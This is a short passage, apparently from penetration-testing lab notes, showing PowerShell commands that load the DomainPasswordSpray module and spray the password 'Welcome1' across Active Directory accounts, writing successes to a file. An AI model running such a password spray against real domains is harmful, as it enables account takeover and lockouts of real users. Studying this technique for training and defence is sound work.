#### Using  [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray).ps1

```powershell
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

